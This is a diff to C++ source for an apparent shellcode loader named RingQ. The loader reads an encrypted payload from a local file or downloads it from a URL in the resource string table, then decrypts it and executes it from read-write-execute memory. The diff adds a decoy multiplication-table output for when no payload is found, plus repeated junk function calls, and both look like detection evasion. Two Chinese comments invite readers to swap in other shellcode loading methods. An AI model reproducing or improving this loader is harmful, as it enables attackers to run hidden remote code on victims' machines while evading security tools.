@@ -249,6 +249,9 @@ void RingQ(const std::string& file_path) {
             size_t byte_sequence_length = decrypted_data.length();
 
 
+
+            // 基础指针调用的例子 可以自行修改Shellcode 加载方式...
+
             LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             generateAndSortArray();
@@ -267,6 +270,8 @@ void RingQ(const std::string& file_path) {
             shellcodeFunc();
 
             VirtualFree(execMemory, 0, MEM_RELEASE);
+
+            // 基础指针调用的例子 可以自行修改Shellcode 加载方式...
 
         }break;
 
@@ -310,13 +315,17 @@ bool downloadFile(const string& url, const string& filename) {
 
 
 int main() {
+
+
     banner();
 
     generateAndSortArray();
 
+
     std::string file_path = "main.txt";
 
     if (isFileExists(file_path)) {
+
         RingQ(file_path);
 
         return 0;
@@ -325,16 +334,44 @@ int main() {
         int resourceId = 101;
         std::wstring myVariable = GetStringTableValue(resourceId);
         std::string file_path_absolute = wstringToString(myVariable);
-
         std::cout << file_path_absolute << std::endl;
 
-        if (file_path_absolute.substr(0, 4) == "http") {
-            const string filename = "main.txt";
-            downloadFile(file_path_absolute, filename);
-            RingQ(filename);
+        if (!file_path_absolute.empty()) {
+
+            if (file_path_absolute.substr(0, 4) == "http") {
+                cout << "Loading StringTable ..." << endl;
+                generateAndSortArray();
+                const string filename = "main.txt";
+                downloadFile(file_path_absolute, filename);
+                RingQ(filename);
+            }
+            else {
+                cout << "Loading LocalFile ..." << endl;
+                generateAndSortArray();
+                cout << file_path_absolute << endl;
+                RingQ(file_path_absolute);
+            }
+
         }
         else {
-            RingQ(file_path_absolute);
+            cout << "No Find main,txt and StringTable ..." << endl;
+            std::cout << "\n";
+
+            for (int i = 1; i <= 9; ++i) {
+                generateAndSortArray();
+
+                for (int j = 1; j <= i; ++j) {
+                    generateAndSortArray();
+
+                    std::cout << j << " x " << i << " = " << (i * j);
+                    if (j < i) {
+                        generateAndSortArray();
+
+                        std::cout << "\t";
+                    }
+                }
+                std::cout << std::endl;
+            }
         }
 
         return 0;
